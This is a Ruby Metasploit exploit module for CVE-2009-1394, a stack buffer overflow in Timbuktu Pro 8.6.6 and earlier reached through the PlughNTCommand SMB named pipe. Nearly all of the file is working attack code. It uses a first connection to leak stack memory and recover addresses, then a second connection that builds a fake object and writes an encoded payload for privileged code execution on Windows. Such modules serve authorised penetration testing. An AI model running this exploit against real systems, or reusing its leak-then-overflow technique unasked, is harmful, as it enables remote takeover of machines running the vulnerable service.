##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Timbuktu <= 8.6.6 PlughNTCommand Named Pipe Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack based buffer overflow in Timbuktu Pro version <= 8.6.6
				in a pretty novel way.

				This exploit requires two connections. The first connection is used to leak stack data
				using the buffer overflow to overwrite the nNumberOfBytesToWrite argument. By supplying
				a large value for this argument it is possible to cause Timbuktu to reply to the initial
				request with leaked stack data. Using this data allows for reliable exploitation of the
				buffer overflow vulnerability.

				Props to Infamous41d for helping in finding this exploitation path.

				The second connection utilizes the data from the data leak to accurately exploit
				the stack based buffer overflow vulnerability.

				TODO:
				hdm suggested using meterpreter's migration capability and restarting the process
				for multishot exploitation.
			},
			'Author'         => [ 'bannedit' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2009-1394' ],
					[ 'OSVDB', '55436' ],
					[ 'BID', '35496' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=809' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'	=>
				{
					'Space'	=> 2048,
				},
			'Platform'	=> 'win',
			'Targets'	=>
				[
					# we use a memory leak technique to get the return address
					# tested on Windows XP SP2/SP3 may require a bit more testing
					[ 'Automatic Targeting',
						{
							# ntdll .data (a fairly reliable address)
							# this address should be relatively stable across platforms/SPs
							'Writable' => 0x7C97B0B0 + 0x10 - 0xc
						}
					],
				],
			'Privileged'		=> true,
			'DisclosureDate'	=> 'Jun 25 2009',
			'DefaultTarget'	=> 0))
	end


	# we make two connections this code just wraps the process
	def smb_connection

		connect()
		smb_login()

		print_status("Connecting to \\\\#{datastore['RHOST']}\\PlughNTCommand named pipe")

		pipe = simple.create_pipe('\\PlughNTCommand')

		fid = pipe.file_id
		trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')

		return pipe

	end


	def mem_leak

		pipe = smb_connection()

		print_status("Constructing memory leak...")

		writable_addr = target['Writable']

		buf = make_nops(114)
		buf[0] =  "3 " # specifies the command
		buf[94] = [writable_addr].pack('V') # this helps us by pass some checks in the code
		buf[98] = [writable_addr].pack('V')
		buf[110] = [0x1ff8].pack('V') # number of bytes to leak

		pipe.write(buf)
		leaked = pipe.read()
		leaked << pipe.read()

		if (leaked.length < 0x1ff8)
			print_error("Error: we did not get back the expected amount of bytes. We got #{leaked.length} bytes")
			pipe.close
			disconnect
			return
		end


		offset = 0x1d64
		stackaddr = leaked[offset, 4].unpack('V')[0]
		bufaddr = stackaddr - 0xcc8

		print_status "Stack address found: stack #{sprintf("0x%x", stackaddr)}  buffer #{sprintf("0x%x", bufaddr)}"

		print_status("Closing connection...")
		pipe.close
		disconnect

		return stackaddr, bufaddr

	end


	def exploit

		stackaddr, bufaddr = mem_leak()

		if (stackaddr.nil? || bufaddr.nil? ) # just to be on the safe side
			print_error("Error: memory leak failed")
			return
		end

		pipe = smb_connection()

		buf = make_nops(1280)
		buf[0] =  "3 "
		buf[94] = [bufaddr+272].pack('V') # create a fake object
		buf[99] = "\x00"
		buf[256] = [bufaddr+256].pack('V')
		buf[260] = [bufaddr+288].pack('V')
		buf[272] = "\x00"
		buf[512] = payload.encoded

		pipe.write(buf)

	end

end
